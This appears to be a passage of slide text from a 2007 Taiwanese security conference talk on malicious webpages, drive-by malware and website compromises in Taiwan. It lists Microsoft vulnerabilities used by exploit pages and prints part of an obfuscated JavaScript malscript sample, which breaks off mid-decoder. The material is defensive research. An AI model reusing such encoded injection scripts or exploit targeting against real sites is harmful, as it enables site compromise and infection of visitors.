Jeremy Chiu,
Lead Security Researcher, X‐Solve Lab
Armorize Technologies
2007‐07‐21
Prefix
 由于近日惡意网页的问题频传，让骇客利用惡意程式大量
入侵，造成了许多政府机关及各企业的机密资料外泄等资
安问题。
为了对抗惡意网页及伴随而來的网路犯罪问题，今年阿码
科技公司的艾克索夫实验室研究团队特别企划了一个研究
计画，针对了台湾区网站进行大规模资安检测。对于现阶
段的惡意网站问题与惡意程式挂马兩大部分进行研究，在
这个报告中将对于植入的技术与惡意程式做深入的技术分
析，活生生的内容，让您了解目前台湾区的各机关与公司
网站被入侵现况。
Taiwan Malicious Webpage and Spyware Hacking
2
About me
 Jeremy Chiu 
Jeremy Chiu (Birdman)
 BTW, I got a new job! ☺
 阿码科技公司 ‐ X‐Solve实验室首席资安研究员
 Lead Security Researcher, X‐Solve Lab, Armorize 
Technologies
Taiwan Malicious Webpage and Spyware Hacking
3
Outline
 New Threat ! Web‐based Malware
 What is Malicious Webpage?
 The Last Malicious Webpage Report in Taiwan
 Cyber Criminal Groups Are Working
 Analysis of Malicious Webpage
 Spyware Hacking
 Automatic Web‐based Malware Analysis System
HIT2007 - Taiwan Malicious Webpage and Spyware Hacking
4
New Threat ! Web‐based Malware
 资安的新挑战 – Web Security
 大家都知道Web 2.0是炒热了新一波的网路热潮，但是
很快的，我相信就有Web 2.0 SP1了。
 Web‐based Malware
 根据最近的各家的研究报告指出，目前Malware与Web 
Security已经狼狈为奸的关系…
 Google研究中指出 1/10的网站是惡意的；而且在1200万
的惡意网页中，其中100万的网页会有下载惡意程式的
行为。
 Google研究中，每2千页左右的网页就会有一个是会植
入惡意程式的。
Taiwan Malicious Webpage and Spyware Hacking
5
HIT2007 - Taiwan Malicious Webpage and Spyware Hacking
6
Location of compromised web sites
Location of malware distribution servers
The majority of malware 
activity seems to happen in 
China, the U.S., Germany 
and Russia
Reference:
Introducing Google's online security efforts
2007‐04 司法院惨遭染指…
Taiwan Malicious Webpage and Spyware Hacking
7
2007.04.18
What is Malicious Webpage?
 Malicious Webpage
 网页被Hacker窜改，放内惡意程式码或是惡意連结，导
致浏览网页的使用遭受影响，其主要目的在于大量植入
Spyware，窃取资料以及盗取密码。
 惡意的程式码
 网页上的惡意Script – Malscript
 攻击使用者环境的程式码 – Exploit
 惡意連结 – Malink (Maliframe)
 为甚么网页会被窜改
 Web Application Security 
 通常是网站以被入侵，以SQL‐Injection问题居多
Taiwan Malicious Webpage and Spyware Hacking
8
9
Hacker成本低廉~
 骇客教学杂志，教学动画，满天飞
 只要看过 “黑XX杂志”，1个月内速成骇客！
 网路上充斥著各式各样的便宜骇客工具
 各种骇客用的免殺后门程式，变形工具
 各种ZeroDay Exploit产生器…
只要有心，人人都是骇客
只要有心，人人都是骇客
常用的挂马Exploit
 主要针对微软环境为主
 MS07-017 – MS Windows Animated Cursor (.ANI) Remote Exploit
 MS07-009
 MS07-004 – VML Remote Code Execution (929969)
 MS06-073
 MS]06-071 – XML Core Services Remote Code Execution (928088)
 MS06-068
 MS06-067
 MS06-057 – WebViewFolderIcon ActiveX
 MS06-055 -
 MS06-014 – MDAC Remote Code Execution
 MS06-013
 MS06-005
 MS06-004
 MS06-001
HIT2007 - Taiwan Malicious Webpage and Spyware Hacking
10
11
http://x‐solve.com/blog
艾克索夫实验室 (资安技术社群)
Analysis of Malicious Webpage
 The Two Malicious Webpage Modes
Taiwan Malicious Webpage and Spyware Hacking
12
Encoded 
Script
Malink
Malink
Exploit Code
Drop 
Spyware
Exploit Code
Encoded 
Script
Encoded 
Script
Drop 
Spyware
Encoded Scripts
 编码过的Java Script來产生HTML
 网页上的Exploit为了逃过扫毒程式或是IDS/IPS等特征
检查，通常使这技巧來达到执行时期才产生惡意HTML
的功能。某种程度來說这是一种SMC，也是PE Packer
才用的技巧。
Taiwan Malicious Webpage and Spyware Hacking
13
e = '0x00' + '5F';str1 = 
"%E4%BC%B7%AA%C0%AD%AC%A7%B4%BB%E3%FE%AA%B7%AD%B7%BE%B7%B4%B7%AC%A7%E6%B8%B7 
%BC%BC%BB%B2%FE%E2%E4%B7%BA%AE%BF%B3%BB%C0%AD%AE%BD%E3%FE%B8%AC%AC%B0%E6%F1 
%F1%B0%AE%BF%BC%B1%E9%F2%BD%B1%B3%F1%AC%AE%BA%F1%FE%C0%A9%B7%BC%AC%B8%E3%EF 
%C0%B8%BB%B7%B9%B8%AC%E3%EF%E2%E4%F1%B7%BA%AE%BF%B3%BB%E2%E4%F1%BC%B7%AA%E2";
str=tmp='';for(i=0;i<str1.length;i+=3){tmp = 